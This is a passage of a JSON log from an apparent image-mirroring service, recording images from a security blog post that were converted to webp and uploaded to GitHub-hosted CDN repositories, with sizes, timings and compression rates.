KB","destSize":"10.2 KB","compressRate":"33%"},{"code":1,"isDone":false,"source":"https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png","sourceStatusCode":200,"destWidth":636,"destHeight":395,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn18@2020_2/2020/09/20/18-27-23-713_c52c72f223266a91.webp","sourceBytes":8751,"destBytes":29968,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2187,"convertSpendMs":12,"createdTime":"2020-09-21 02:27:22","host":"us-036*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.5 KB","destSize":"29.3 KB","compressRate":"342.5%"},{"code":1,"isDone":false,"source":"https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png","sourceStatusCode":200,"destWidth":604,"destHeight":262,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn93@2020_1/2020/09/20/18-27-23-849_447dccd77b4e5657.webp","sourceBytes":7221,"destBytes":30094,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2304,"convertSpendMs":10,"createdTime":"2020-09-21 02:27:22","host":"us-54*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.1 KB","destSize":"29.4 KB","compressRate":"416.8%"},{"code":1,"isDone":false,"source":"https://p3.ssl.qhimg.com/t01136077519030f0da.png","sourceStatusCode":200,"destWidth":564,"destHeight":281,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn21@2020_4/2020/09/20/18-27-23-829_dac6a4d3745fbeac.webp","sourceBytes":8894,"destBytes":41486,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2371,"convertSpendMs":14,"createdTime":"2020-09-21 02:27:22","host":"us-024*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.7 KB","destSize":"40.5 KB","compressRate":"466.4%"},{"code":1,"isDone":false,"source":"https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png","sourceStatusCode":200,"destWidth":544,"destHeight":132,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn38@2020_2/2020/09/20/18-27-23-929_cfdb4f0fdb8f3a26.webp","sourceBytes":3983,"destBytes":18518,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2387,"convertSpendMs":6,"createdTime":"2020-09-21 02:27:22","host":"us-040*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.9 KB","destSize":"18.1 KB","compressRate":"464.9%"},{"code":1,"isDone":false,"source":"https://p2.ssl.qhimg.com/t018d9770429200c59e.png","sourceStatusCode":200,"destWidth":468,"destHeight":310,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn13@2020_4/2020/09/20/18-27-23-798_7436faf15412e68d.webp","sourceBytes":37461,"destBytes":10958,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2332,"convertSpendMs":11,"createdTime":"2020-09-21 02:27:22","host":"europe-58*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.6 KB","destSize":"10.7 KB","compressRate":"29.3%"},{"code":1,"isDone":false,"source":"https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png","sourceStatusCode":200,"destWidth":915,"destHeight":256,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn6@2020_2/2020/09/20/18-27-23-998_37b5c9f908a95440.webp","sourceBytes":8860,"destBytes":36730,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2535,"convertSpendMs":36,"createdTime":"2020-09-21 02:27:22","host":"us-007*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.7 KB","destSize":"35.9 KB","compressRate":"414.6%"},{"code":1,"isDone":false,"source":"https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png","sourceStatusCode":200,"destWidth":627,"destHeight":229,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn25@2020_4/2020/09/20/18-27-24-334_7a6814ed4527d756.webp","sourceBytes":13489,"destBytes":26056,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":2804,"convertSpendMs":11,"createdTime":"2020-09-21 02:27:22","host":"us-011*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.2 KB","destSize":"25.4 KB","compressRate":"193.2%"},{"code":1,"isDone":false,"source":"https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png","sourceStatusCode":200,"destWidth":731,"destHeight":394,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn2@2020_1/2020/09/20/18-27-24-589_521ea21cee8a2ab6.webp","sourceBytes":20545,"destBytes":20796,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":3082,"convertSpendMs":16,"createdTime":"2020-09-21 02:27:22","host":"us-020*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.1 KB","destSize":"20.3 KB","compressRate":"101.2%"},{"code":1,"isDone":false,"source":"https://p1.ssl.qhimg.com/t01125524638060a979.png","sourceStatusCode":200,"destWidth":749,"destHeight":522,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn33@2020_3/2020/09/20/18-27-24-532_929ea9113cafab3b.webp","sourceBytes":14557,"destBytes":71992,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":3290,"convertSpendMs":20,"createdTime":"2020-09-21 02:27:22","host":"europe62*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.2 KB","destSize":"70.3 KB","compressRate":"494.6%"},{"code":1,"isDone":false,"source":"http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn98@2020_3/2020/09/20/18-27-25-229_95919ecbd682dd35.jpg","sourceBytes":53952,"destBytes":53952,"feedId":18102,"totalSpendMs":3766,"convertSpendMs":4,"createdTime":"2020-09-21 02:27:22","host":"us-032*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f,72aa9d0804284c5f4974ca836700151f,72aa9d0804284c5f4974ca836700151f,72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"52.7 KB","destSize":"52.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png","sourceStatusCode":200,"destWidth":544,"destHeight":405,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn29@2020_5/2020/09/20/18-27-28-252_427630b31c549135.webp","sourceBytes":4730,"destBytes":23592,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":6747,"convertSpendMs":14,"createdTime":"2020-09-21 02:27:22","host":"europe-24*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"4.6 KB","destSize":"23 KB","compressRate":"498.8%"},{"code":1,"isDone":false,"source":"https://p5.ssl.qhimg.com/t010c618eea55cba279.png","sourceStatusCode":200,"destWidth":669,"destHeight":267,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn90@2020_3/2020/09/20/18-27-28-180_f5476134b8f84df2.webp","sourceBytes":8383,"destBytes":33650,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":6785,"convertSpendMs":11,"createdTime":"2020-09-21 02:27:22","host":"europe66*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.2 KB","destSize":"32.9 KB","compressRate":"401.4%"},{"code":1,"isDone":false,"source":"https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png","sourceStatusCode":200,"destWidth":725,"destHeight":316,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn9@2020_4/2020/09/20/18-27-28-226_26a32a13bd1579cc.webp","sourceBytes":3311,"destBytes":26448,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":6807,"convertSpendMs":18,"createdTime":"2020-09-21 02:27:22","host":"europe70*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.2 KB","destSize":"25.8 KB","compressRate":"798.8%"}],"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx15":1,"myreaderx10":1,"myreaderx21":1,"myreaderx11":1,"myreaderx33":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":1,"myreaderx30":1,"myreaderx31":1,"myreaderx29":1,"myreaderx18":1},"failGithubMap":{}}